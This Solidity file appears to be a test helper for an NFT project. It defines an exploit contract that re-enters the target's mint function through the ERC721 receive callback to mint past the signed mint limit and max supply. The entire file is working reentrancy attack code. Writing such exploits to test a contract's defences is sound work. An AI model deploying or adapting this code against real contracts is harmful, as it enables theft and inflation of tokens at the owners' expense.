// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
import {OriginERC721V6} from '../nft/OriginERC721V6.sol';

import 'hardhat/console.sol';

/**
 * Exploit contract that explicitly targets a reentrancy behavior allowing
 * a callback contract to mint tokens up to mint limit less what has already
 * been minted in the same call.
 *
 * So if a user was signed to be allows to mint 10, a specifically constructed
 * callback could mint 9, then 8, then 7, [..], then let the original call
 * finish to receive more NFTs than max supply or the user's mint limit.
 */
contract ERC721V6Reentrancy {
    OriginERC721V6 public target;

    bool public reentrancy;
    bytes private sig;
    uint256 private mintLimit;
    uint256 private expiration;

    constructor(
        address payable target_,
        uint256 mintLimit_,
        uint256 expiration_
    ) {
        target = OriginERC721V6(target_);
        mintLimit = mintLimit_;
        expiration = expiration_;
    }

    function mint(bytes memory sig_) external {
        console.log('ERC721V6Reentrancy.mint()');
        console.log('ERC721V6Reentrancy.mint() chainID: %s', block.chainid);
        sig = sig_;
        reentrancy = false;

        target.mint(
            address(this), // to
            mintLimit / 2, // count
            0, // price
            mintLimit, // mintLimit
            expiration, // expires
            sig // signature
        );
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    ) external returns (bytes4) {
        console.log('ERC721V6Reentrancy.onERC721Received()');
        if (!reentrancy) {
            reentrancy = true;

            console.log('ERC721V6Reentrancy reentering...');
            target.mint(
                address(this),
                // Must be one less than already minted in this transaction
                // because one token has already bee minted before this cb
                // TODO: part of the signature
                mintLimit / 2,
                0,
                mintLimit,
                expiration,
                sig
            );
            console.log('ERC721V6Reentrancy reentered');
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
